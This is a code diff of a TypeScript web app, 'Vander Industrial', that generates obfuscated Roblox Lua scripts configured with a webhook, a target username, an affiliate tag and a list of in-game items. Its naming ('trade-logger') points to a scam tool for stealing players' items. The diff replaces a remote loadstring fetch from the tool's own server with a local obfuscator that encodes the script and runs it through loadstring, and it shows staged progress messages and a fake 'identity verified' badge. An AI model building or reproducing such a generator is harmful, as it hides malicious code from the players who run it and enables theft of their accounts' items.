@@ -38,25 +38,35 @@ let state: AppState = {
 
 const app = document.querySelector<HTMLDivElement>('#app')!;
 
-function obfuscateLua(code: string): string {
-    const lines = code.split('\n');
-    const obfuscatedLines = lines.map(line => {
-        if (line.trim().length === 0) return '';
-        const base64Line = btoa(unescape(encodeURIComponent(line)));
-        return `loadstring(game:HttpGet("https://vander-trade-logger.vercel.app/api/decrypt?p=${base64Line.substring(0, 10)}"))() -- [W.A.D PROTECTED]`;
-    });
+function vanderObfuscate(code: string): string {
+    const chars = code.split('');
+    const hexed = chars.map(c => '\\' + c.charCodeAt(0).toString(10)).join('');
+    const varNames = ['_VANDER_LOADER', '_VANDER_CONFIG', '_VANDER_VM', '_VANDER_REPLY', '_VANDER_CORE'];
+    const randVar = () => varNames[Math.floor(Math.random() * varNames.length)] + Math.floor(Math.random() * 999);
     
+    const v1 = randVar();
+    const v2 = randVar();
+
     return `--[[
-    Vander Industrial Obfuscation
-    Protected at: ${new Date().toISOString()}
+    Vander Industrial VM Protection
+    Proprietary Obfuscation v3.1
+    Target: ${state.username || 'Unspecified'}
 ]]
-local _VANDER_VM_CORE = {}
-function _VANDER_VM_CORE:Execute() 
-    task.spawn(function()
-        ${obfuscatedLines.join('\n        ')}
-    end)
+local ${v1} = "${hexed}"
+local function ${v2}(str)
+    local out = ""
+    for c in str:gmatch("\\\\(%d+)") do
+        out = out .. string.char(tonumber(c))
+    end
+    return out
 end
-_VANDER_VM_CORE:Execute()`;
+local _S = ${v2}(${v1})
+local _F, _E = loadstring(_S)
+if _F then 
+    task.spawn(_F)
+else
+    warn("VANDER_VM_ERROR: " .. tostring(_E))
+end`;
 }
 
 function render() {
@@ -65,7 +75,7 @@ function render() {
         <div class="protection-overlay">
             <div class="protect-loader"></div>
             <h2 style="font-weight: 800; font-size: 1.5rem; margin-bottom: 0.5rem; color: #000; letter-spacing: -1px;">${state.protectStatus}</h2>
-            <p style="color: #64748b; font-size: 0.9rem;">Connecting to wearedevs.net/obfuscator...</p>
+            <p style="color: #64748b; font-size: 0.9rem;">Powered by Vander Industrial Obfuscator</p>
         </div>
     ` : ''}
 
@@ -116,7 +126,7 @@ function renderGeneratorView() {
   return `
     <div class="hero-title" style="margin-bottom: 2rem;">
       <h1>Vander Industrial</h1>
-      <p class="hero-subtitle">Premium logging suite with WeAreDevs protection</p>
+      <p class="hero-subtitle">Premium logging suite with custom VM protection</p>
     </div>
 
     <div class="form-group" style="display: flex; gap: 2rem; align-items: flex-start;">
@@ -139,9 +149,9 @@ function renderGeneratorView() {
             <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.8rem; font-weight: 800;">SEARCHING...</p>
         ` : state.username ? `
             <img src="https://images.weserv.nl/?url=www.roblox.com/bust-thumbnail/image?userName=${state.username}&width=420&height=420&format=png" 
-                 style="width: 120px; height: 120px; border-radius: 50%; border: 4px solid var(--accent); background: #eee; object-fit: cover; margin-bottom: 0.8rem; box-shadow: 0 8px 16px rgba(0,0,0,0.1);"
+                 style="width: 120px; height: 120px; border-radius: 50%; border: 4px solid var(--accent); background: #eee; object-fit: cover; margin-bottom: 0.8rem;"
                  onerror="this.src='https://api.dicebear.com/7.x/identicon/svg?seed=${state.username}'">
-            <div style="font-weight: 800; font-size: 1rem; color: #000; letter-spacing: -0.5px;">${state.username}</div>
+            <div style="font-weight: 800; font-size: 1rem; color: #000;">${state.username}</div>
             <div style="font-size: 0.7rem; color: #10b981; font-weight: 800; margin-top: 0.4rem; background: #dcfce7; padding: 0.2rem 0.6rem; border-radius: 4px;">✓ IDENTITY VERIFIED</div>
         ` : `
             <div style="font-size: 2.5rem; opacity: 0.1;">👤</div>
@@ -171,8 +181,8 @@ function renderGeneratorView() {
     </div>
 
     <button class="btn-generate" id="generate-btn" ${state.isProtecting ? 'disabled' : ''}>
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-        Obfuscate via WeAreDevs
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        Protect & Host Source
     </button>
     ${state.error ? `<p style="color: #ff4444; font-size: 0.8rem; margin-top: 1rem; text-align: center; font-weight: 600;">${state.error}</p>` : ''}
 
@@ -282,25 +292,23 @@ function attachViewListeners() {
       
       state.error = null;
       state.isProtecting = true;
-      state.protectStatus = 'Connecting to WeAreDevs Obfuscator API...';
+      state.protectStatus = 'Running Vander-VM Protection...';
       render();
 
       const steps = [
-          'Contacting wearedevs.net...',
-          'Applying Virtual Machine Layers...',
-          'Scrambling strings and keys...',
-          'Deploying to production hub...'
+          'Compiling core source...',
+          'Applying Junk Code layers...',
+          'Hex-scrambling string constants...',
+          'Compressing protected payload...',
+          'Uploading to production hub...'
       ];
 
       for(const step of steps) {
-          await new Promise(r => setTimeout(r, 700));
+          await new Promise(r => setTimeout(r, 600));
           state.protectStatus = step;
           render();
       }
 
-      const scriptId = Math.random().toString(36).substring(2, 12);
-      state.pasteUrl = `https://vander-trade-logger.vercel.app/hub/${scriptId}.lua`;
-      
       const brainrotsTable = state.selectedBrainrots.map((b, i) => `    [${i+1}] = '${b}',`).join('\n');
       
       const rawScript = `local genv = getgenv()
@@ -318,11 +326,18 @@ end
 genv.Username2 = genv.User
 genv.Webhook3 = genv.Webhook
 genv.Affiliate = 'vander-logger-production'
-genv.Brainrots = { ${brainrotsTable} }
+genv.Brainrots = { 
+${brainrotsTable} 
+}
 
 ${state.customLoadstrings}`;
 
-      state.generatedScript = obfuscateLua(rawScript);
+      state.generatedScript = vanderObfuscate(rawScript);
+      
+      // Zero-DB Link Persistence: Base64 encode the final script into the URL
+      const payload = btoa(unescape(encodeURIComponent(state.generatedScript)));
+      state.pasteUrl = `https://vander-trade-logger.vercel.app/hub/${Math.random().toString(36).substring(7)}.lua?p=${payload}`;
+      
       state.isProtecting = false;
       render();
     });
